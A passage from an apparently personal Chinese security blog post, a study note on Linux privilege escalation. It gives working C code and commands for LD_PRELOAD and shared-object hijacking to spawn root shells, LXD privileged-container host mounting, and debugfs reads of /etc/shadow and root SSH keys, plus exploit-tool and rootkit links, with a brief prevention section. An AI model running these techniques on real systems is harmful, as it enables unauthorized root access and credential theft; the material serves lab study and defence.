+<p>提权的先遣条件，被劫持的命令或程序必须具有较高的权限（以root运行、SUID或SUDO等）。同时在<code>/etc/sudoers</code>文件中需要定义<code>env_keep+=LD_PRELOAD</code></p>
+<ol>
+<li>
+<p>确认一个可以用高权限执行的程序或命令</p>
+</li>
+<li>
+<p>编写脚本，c语言等</p>
+</li>
+</ol>
+<pre><code class="hljs scss"><span class="hljs-selector-id">#include</span> &lt;stdio<span class="hljs-selector-class">.h</span>&gt;
+<span class="hljs-selector-id">#include</span> &lt;sys/types<span class="hljs-selector-class">.h</span>&gt;
+<span class="hljs-selector-id">#include</span> &lt;stdlib<span class="hljs-selector-class">.h</span>&gt;
+
+void <span class="hljs-built_in">_init</span>() {
+<span class="hljs-built_in">unsetenv</span>("LD_PRELOAD");
+<span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);
+<span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);
+<span class="hljs-built_in">system</span>("/bin/bash");
+}</code></pre>
+<p>对其编译为<code>.so</code>动态文件，</p>
+<pre><code class="hljs scss">gcc -fPIC -shared -o root<span class="hljs-selector-class">.so</span> root<span class="hljs-selector-class">.c</span> -nostartfiles
+<span class="hljs-comment">// -fPIC：生成位置独立的代码（Position Independent Code），以便在共享库中使用。</span>
+<span class="hljs-comment">// -shared：指示编译器生成共享对象（shared object）库文件。</span>
+<span class="hljs-comment">// -o root.so：指定输出文件名为 root.so。</span>
+<span class="hljs-comment">// root.c：源文件的名称为 root.c，这是要进行编译的源代码文件。</span>
+<span class="hljs-comment">// -nostartfiles：禁止链接启动文件，不使用标准的启动文件。</span></code></pre>
+<ol start="3">
+<li>高权限运行程序或命令，指定对应的恶意文件库，<code>sudo LD_PRELOAD=/tmp/root.so 程序或命令</code></li>
+<li>攻击示例：</li>
+</ol>
+<ul>
+<li><code>sudo LD_PRELOAD=/home/htb-student/root.so /usr/bin/openssl</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543481.png" alt></li>
+</ul>
+<h2 id="共享对象劫持提权">共享对象劫持提权</h2>
+<p>不同于共享库提权，针对于新开发的程序和二进制可执行文件。</p>
+<ol>
+<li><code>ldd 程序</code>查看其所使用的共享对象文件和共享库</li>
+<li>找到其程序利用的非标准库依赖</li>
+<li>利用<code>readelf -d 程序 | grep PATH</code>查看程序自定义的共享库位置</li>
+<li>找到自定义的共享库位置，自建链接库的文件到该共享库文件夹，执行程序查看是否缺少函数</li>
+<li>创建.c文件，自定义这个函数名，设置uid为root，利用其执行bash或sh</li>
+</ol>
+<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-type">void</span> 函数名() {
+    setuid(<span class="hljs-number">0</span>);
+    system(<span class="hljs-string">"/bin/sh -p"</span>);
+}</code></pre>
+<ol start="6">
+<li>编译文件为动态链接文件<code>gcc c文件 -fPIC -shared -o /共享库/共享对象文件</code></li>
+<li>执行即可Root</li>
+</ol>
+<p>简单案例如下（抽象）：</p>
+<pre><code class="hljs scss"># Lets find <span class="hljs-selector-tag">a</span> SUID using <span class="hljs-selector-tag">a</span> non-standard library
+ldd some_suid  <span class="hljs-comment">// ldd查看共享对象文件和共享库</span>
+something<span class="hljs-selector-class">.so</span> =&gt; /lib/x86_64-linux-gnu/something<span class="hljs-selector-class">.so</span>
+
+# The SUID also loads libraries from <span class="hljs-selector-tag">a</span> custom location where we can write
+readelf -d payroll  | grep PATH
+<span class="hljs-number">0</span>x000000000000001d (RUNPATH)            Library runpath: [/development]
+// readelf命令查看程序自定义的共享库位置</code></pre>
+<p>现在我们已经找到一个SUID二进制文件，它从一个我们可以写入的文件夹加载库，请在该文件夹中创建具有必要名称的库：</p>
+<pre><code class="hljs scss"><span class="hljs-comment">//gcc src.c -fPIC -shared -o /development/libshared.so</span>
+<span class="hljs-selector-id">#include</span> &lt;stdio<span class="hljs-selector-class">.h</span>&gt;
+<span class="hljs-selector-id">#include</span> &lt;stdlib<span class="hljs-selector-class">.h</span>&gt;
+
+static void <span class="hljs-built_in">hijack</span>() <span class="hljs-built_in">__attribute__</span>((constructor));
+
+void <span class="hljs-built_in">hijack</span>() {
+<span class="hljs-built_in">setresuid</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);
+<span class="hljs-built_in">system</span>("/bin/bash -p");
+}</code></pre>
+<p>如果您遇到以下错误：</p>
+<pre><code class="hljs scss">./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name</code></pre>
+<p>这意味着你生成的库需要有一个名为<code>a_function_name</code>的函数。</p>
+<p>随后就如同上述所说的，创建.c文件，自定义这个函数名，设置uid为root，利用其执行bash或sh</p>
+<h2 id="利用特权组提权">利用特权组提权</h2>
+<p>本部分我也有点懵，暂时做一个记录，日后实践到，或者能进一步解决了，再补充。</p>
+<p>利用id显示看一下用户所在的特权组  ，例如<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543482.png" alt><br>
+根据特权组判断使用的提权方法</p>
+<h4 id="lxclxd提权">LXC/LXD提权</h4>
+<blockquote>
+<p>lxc（Linux container），Linux自带的容器；</p>
+<p>lxd，简单地说，LXD 就是一个提供了 REST API 的 LXC 容器管理器</p>
+<p>LXD是一个root进程，它负责执行任意用户的LXD UNIX套接字写入访问操作。而且在某些情况下，LXD甚至都不会调用它的用户权限进行检查和匹配，本文就是讨论这种攻击方式。</p>
+<p>Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于Chroot和完整开发的虚拟机之间，LXC可以创建一个跟正常Linux操作系统十分接近的环境，但是不需要使用到单独的内核资源。</p>
+<p>Linux Daemon（LXD）是一个轻量级容器管理程序，而LXD是基于LXC容器技术实现的，而这种技术之前Docker也使用过。LXD使用了稳定的LXC API来完成所有的后台容器管理工作，并且增加了REST API支持，更进一步地提升了用户体验度。</p>
+</blockquote>
+<p>总的来说原理如下：用户创建一个容器，再用容器挂载宿主机的磁盘，然后用容器的权限去操作宿主机磁盘内容从而达到提权。</p>
+<ul>
+<li>
+<p>LXC的特权容器挂载系统目录<br>
+启动LXD初始化，选项默认即可<br>
+导入<code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code>本地镜像（例子）<br>
+启动<code>security.privileged</code>为true的特权容器，启动没有UID映射的容器，使得容器中root用户与主机上的root用户相同<code>lxc init alpine r00t -c security.privileged=true</code><br>
+挂载主机文件系统<code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</code><br>
+在容器中启动shell<code>lxc start r00t</code>和<code>lxc exec r00t /bin/sh</code>就可以以root身份连接到文件系统</p>
+</li>
+<li>
+<p>例如：一个低权限的用户能够创建一个用于host和container通信的socket，当将host中已经创建的一个socket和container绑定后，它们之间的连接通信会以LXD服务的凭证（root权限）而不是调用用户的凭证；所以当container中发送socket和host通信时，此时host端的socket则是root权限。<br>
+具体复现查看<a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/05/21/LXD-LPE.html">Linux Privilege Escalation via LXD &amp; Hijacked UNIX Socket Credentials</a>和中文<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/179407">复现讲解</a>还有自动化利用<a target="_blank" rel="noopener" href="https://github.com/initstring/lxd_root">脚本</a></p>
+</li>
+</ul>
+<p>以下举几个例子：<br>
+这一个较为简易，只是展示了些许步骤</p>
+<p>如果我们已经确定靶机当前用户或者某个用户所属组是lxd组，查看lxd，lxc两个二进制文件是否存在即可。（当然是其他用户所属组为lxd，那你需要转到那个用户，否则不行）<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543483.png" alt></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543484.png" alt></p>
+<p>首先，在本地机上下载lxd的镜像模板文件，例如：<a target="_blank" rel="noopener" href="https://github.com/saghul/lxd-alpine-builder.git">https://github.com/saghul/lxd-alpine-builder.git</a><br>
+然后，执行“build -alpine”命令完成最新版本的Alpine镜像构建，此操作必须由root用户完成；</p>
+<pre><code class="hljs scss">cd lxd-alpine-builder   
+sudo ./build-alpine</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543485.png" alt><br>
+然后想办法，只需要将该模板文件上传至目标机即可，比如可以vps开一个http.server的服务进行下载</p>
+<blockquote>
+<p>注意：在以镜像模板创建容器之前先初始化lxd比较好，不然可能没有存储池storage pool</p>
+</blockquote>
+<pre><code class="hljs scss">lxd init  <span class="hljs-comment">//lxd 初始化，一路回车默认回车就行</span>
+
+lxc image import alpine-v3<span class="hljs-selector-class">.12-x86_64-20200902_1515</span><span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> <span class="hljs-attr">--alias</span>  image_name</code></pre>
+<p>接着通过这个lxc容器提权：</p>
+<pre><code class="hljs scss">lxc init image_name ignite -c security<span class="hljs-selector-class">.privileged</span>=true  <span class="hljs-comment">// 初始化镜像</span>
+
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true <span class="hljs-comment">//这一步是挂载磁盘</span>
+
+lxc start ignite
+
+lxc exec ignite /bin/sh</code></pre>
+<p>即可成为root，执行chroot&nbsp; /mnt/root可获得root的全部权限</p>
+<blockquote>
+<p>lxd组用户可以任意镜像创建容器，并将当前系统根目录挂载到已创建容器的mnt目录下，/mnt/root/目录是一个完整的根目录，可以使用chroot获取到这个根目录的完整root权限。</p>
+</blockquote>
+<p>初始化结果展示：<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543486.png" alt><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543487.png" alt></p>
+<p>挂载磁盘结果展示：<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543488.png" alt></p>
+<p>启动镜像并进入镜像访问任意文件结果展示：<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543489.png" alt></p>
+<p>另附上一个国外案例讲解，不过已被译为中文：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kqdssheng/p/18270185">Linux 提权-LXD容器</a></p>
+<h3 id="docker组提权">Docker组提权</h3>
+<p>见第三方服务提权</p>
+<h3 id="disk提权">Disk提权</h3>
+<p>Disk组用户对<code>/dev</code>目录具有root权限，利用<code>debugfs -rw /dev/sda2</code>可以利用debugfs的root权限访问文件系统</p>
+<pre><code class="hljs scss">debugfs -rw /dev/sda2
+debugfs: cd /root
+debugfs: ls
+debugfs: cat /root/.ssh/id_rsa
+debugfs: cat /etc/shadow</code></pre>
+<p>简易步骤如下：</p>
+<p>查看用户所属id<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543490.png" alt></p>
+<p>首先查看属于我们组的硬盘：<code>ls -l /dev</code>，接着查看/root属于哪个盘：<code>df -h</code></p>
+<p>如果发现/root盘属于disk组，比如sd2组：</p>
+<pre><code class="hljs scss">debugfs /dev/sd2
+cd /root
+ls</code></pre>
+<p>如果ls有效，尝试直接查看root里面的flag（亦说明实现提权），如果没有效，那么尝试下载ssh私钥，然后ssh登录（但此时你仍然在debugfs中）</p>
+<pre><code class="hljs scss">cd /root/<span class="hljs-selector-class">.ssh</span>
+cat id_rsa</code></pre>
+<p>随后拷贝到本地即可</p>
+<pre><code class="hljs scss">vi id_rsa
+chmod <span class="hljs-number">600</span> id_rsa</code></pre>
+<p>这样我们就可以直接登录：<code>ssh -i id_rsa root@192.168.244.181</code></p>
+<h3 id="adm提权">ADM提权</h3>
+<p>ADM组在Linux中用于系统监控任务，组内的用户可以读取<code>/var/log</code>的日志文件。</p>
+<p>主要用来收集存储在日志文件中的敏感数据或枚举用户操作和运行 CronJobs。</p>
+<h2 id="其他漏洞提权">其他漏洞提权</h2>
+<p><a target="_blank" rel="noopener" href="https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics">https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></p>
+<h1 id="0x05-linux提权利用工具">0x05 Linux提权利用工具</h1>
+<p><strong>一、本地扫描工具</strong></p>
+<ul>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/mi1k7ea/M7-05">https://github.com/mi1k7ea/M7-05</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy(%E6%97%A0%E9%9C%80root%E6%9D%83%E9%99%90%E5%8D%B3%E5%8F%AF%E7%9B%91%E6%8E%A7linux%E8%BF%9B%E7%A8%8B)">https://github.com/DominicBreuker/pspy(无需root权限即可监控linux进程)</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/jidongdeatao/LinuxTest">https://github.com/jidongdeatao/LinuxTest</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py">https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py</a><br>
+通过利用Linux内核中的漏洞，有时我们可以提升特权。我们通常需要了解的操作系统，体系结构和内核版本是测试内核利用是否可行的测试方法。</p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a>(BeRoot 是一个后利用工具，用于检查 Linux 和 Mac OS 上常见的错误配置，以找到提升权限的方法)<br>
+<strong>二、内核漏洞查询</strong></p>
+</li>
+<li>
+<p>searchsploit</p>
+<ul>
+<li>searchsploit linux 2.6 ubuntu priv esc</li>
+<li>searchsploit Privilege Escalation</li>
+</ul>
+</li>
+<li>
+<p>其他工具<br>
+<strong>三、其他综合工具</strong></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/topics/privilege-escalation">https://github.com/topics/privilege-escalation</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/topics/privilege-escalation-exploits">https://github.com/topics/privilege-escalation-exploits</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/topics/kernel-exploitation">https://github.com/topics/kernel-exploitation</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/topics/linux-kernel">https://github.com/topics/linux-kernel</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/topics/linux-exploits">https://github.com/topics/linux-exploits</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/topics/kernel-exploitation">https://github.com/topics/kernel-exploitation</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/topics/linux-kernel">https://github.com/topics/linux-kernel</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://github.com/topics/linux-exploits">https://github.com/topics/linux-exploits</a><br>
+<strong>四、Unix 特权</strong><br>
+<a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a><br>
+运行脚本并将输出保存在文件中，然后使用grep发出警告。</p>
+</li>
+</ul>
+<h1 id="0x06-linux内核高级后门">0x06-Linux内核高级后门</h1>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/imagemlt/rootit.ko">https://github.com/imagemlt/rootit.ko</a></li>
+</ul>
+<h1 id="0x07-linux提权环境靶场">0x07-Linux提权环境靶场</h1>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/rishabhkant07/Privilege-Escalation-Cheatsheet-Vulnhub-">https://github.com/rishabhkant07/Privilege-Escalation-Cheatsheet-Vulnhub-</a></li>
+</ul>
+<h1 id="0x08-预防提权">0x08 预防提权</h1>
+<ul>
+<li>系统管理员要安全，准确的配置SUID执行文件。</li>
+<li>一些没必要以高权限用户执行的文件，应该取消权限。</li>
+<li>规避使用无密码root 执行命令，脚本等。</li>
+<li>修复/升级存在已知漏洞的组件，升级操作系统版本最新版。</li>
+<li>Linux 2.2 之后可以为命令增加 capabilities, 以p 师傅博客里的给nmap增加该属性为例。</li>
+<li>升级第三方服务，修复已知漏洞</li>
+</ul>
+<pre><code class="hljs scss">sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap
+nmap <span class="hljs-attr">--privileged</span> -sS <span class="hljs-number">192.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.1</span></code></pre>
+<p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a></p>
+<h1 id="0x09-参考文章">0x09 参考文章</h1>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11664?time__1311=Cq0xRQKeqqlx0nWoP0Ku4mqGISKWwmD#toc-45">Linux提权基础分享和讨论</a><br>
+<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2767?time__1311=n4%2BxniDQitDt0%3DoG%3DoDsFbeWTRQc5bN4D">Linux环境变量提权</a><br>
+<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7924?time__1311=n4%2BxnD0G0%3DeQwqmqD5DsA3OhDcGbtTYrDRjYD#toc-6">对Linux 提权的简单总结</a><br>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41123867/article/details/105135079">Linux sudo命令和sudoers文件</a><br>
+<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kqdssheng/p/18310245">https://www.cnblogs.com/kqdssheng/p/18310245</a><br>
+<a target="_blank" rel="noopener" href="https://www.cnblogs.com/qianfu/p/17530952.html" title="发布于 2023-03-01 18:38">操作系统权限提升(二十三)之Linux提权-通配符(ws)提权</a><br>
+<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/176255">利用通配符进行Linux本地提权</a><br>
+<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/11696915.html" title="发布于 2019-10-18 10:32">rsync提权</a><br>
+<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6544?time__1311=n4%2BxnD0Dg7G%3DY7KPD5DsA3xCqiKbwuDAK42oe%2BQx">实战遇见到最多的第三方提权</a><br>
+<a target="_blank" rel="noopener" href="https://loong716.top/posts/Linux_Wildcard_Wilderness/#0x03-exploit-rsync">Linux提权鸡肋小trick——Wildcard Wilderness</a><br>
+<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/linux-hardening/privilege-escalation/wildcards-spare-tricks">Wildcards Spare tricks</a><br>
+<a target="_blank" rel="noopener" href="https://tttang.com/archive/1414/#toc_0x03-suid">从Challenge42看Linux提权基本技巧</a><br>
+<a target="_blank" rel="noopener" href="https://gotarget.top/archives/linux-ti-quan-de-duo-zhong-fang-shi#%E4%B8%83%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">Linux提权的多种方式</a><br>
+<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/280398.html">手把手教你Linux提权</a><br>
+<a target="_blank" rel="noopener" href="https://cnblogs.com/jhinjax/p/17078938.html">lxd组的提权方法</a><br>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/YouthBelief/article/details/123548739">linux lxd组用户提权至root</a></p>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/07/24/thm-windows-nei-he/">THM-Windows内核</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/07/20/linux-ti-quan-xue-xi-yi/">Linux提权学习之rbash逃逸</a></div></section></div>
+
+
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>感谢大佬们的不吝赐教！</p>
+
+    </section>
+    <section class='body cmt-body twikoo'>
+      
+
+<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
+本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">0x02 Linux基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9D%83%E9%99%90"><span class="toc-text">什么是权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC"><span class="toc-text">Linux内核版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E5%8F%91%E8%A1%8C%E7%89%88%E6%9C%AC"><span class="toc-text">Linux发行版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E6%8F%90%E6%9D%83%E6%A6%82%E5%BF%B5"><span class="toc-text">Linux提权概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E6%8F%90%E6%9D%83%E7%9B%AE%E7%9A%84"><span class="toc-text">Linux提权目的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E6%8F%90%E6%9D%83%E6%9C%AC%E8%B4%A8"><span class="toc-text">Linux提权本质</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-linux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">0x03 Linux信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E5%A4%87%E4%BF%A1%E6%81%AF"><span class="toc-text">内核、操作系统、设备信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%92%8C%E7%BE%A4%E7%BB%84"><span class="toc-text">用户和群组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E4%BF%A1%E6%81%AF"><span class="toc-text">用户权限信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF"><span class="toc-text">环境信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E6%9C%8D%E5%8A%A1"><span class="toc-text">进程和服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E7%9A%84%E8%BD%AF%E4%BB%B6"><span class="toc-text">查看安装的软件</span></a></li><li class="toc-item toc-level-2"><a 